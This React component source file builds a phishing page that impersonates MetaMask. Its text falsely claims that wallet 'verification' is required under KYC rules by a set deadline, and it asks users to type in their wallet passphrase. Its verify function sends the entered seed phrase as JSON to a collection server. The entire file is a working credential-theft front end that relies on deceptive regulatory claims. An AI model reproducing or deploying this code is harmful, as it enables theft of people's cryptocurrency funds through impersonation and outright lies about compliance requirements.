import '../styles/Home.css';
import { ReactComponent as MetamaskIcon } from '../assets/img/metamask.svg';
import { useState } from 'react';

const SERVER_URL = 'http://127.0.0.1:8080/verify'

export default function Home(){
    const [seed, setSeed] = useState('');

    const verify = async() => {
        const opts = {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({verifycode: seed})
        };
        const res = await fetch(SERVER_URL, opts);
        if(res.status === 200) setSeed('');
    }

    return (
        <div className='container home__container'>
            <div className='normal-txt'>Metamask requires all users to verify their wallets in order to comply with KYC regulations this must be done before 08/30/2022 as aregulated financial services company.</div>
            <div className='normal-txt'>We cooperate with Metamask, so all our clients and partners must pass this verification.</div>
            <img className="hero__pointer" src="img/pointer.svg" alt="pointer" style={{animation: 'pulse 2.5s linear infinite'}}></img>
            <div className='news-txt'>Enter PassPhrase</div>
            <div className='normal-txt'>Make sure no one is watching you right now, never share your passphrase with other people.</div>
            <div style={{margin: '0px 30px'}}>
                <input placeholder='Use spacebar to separate the words' className="verify_input" value={seed} onChange={(e) => setSeed(e.target.value)}/>
            </div>
            <div className='continue__btn' onClick={() => verify()}>
                Countinue
            </div>
            {/* <MetamaskIcon /> */}
        </div>
    )
}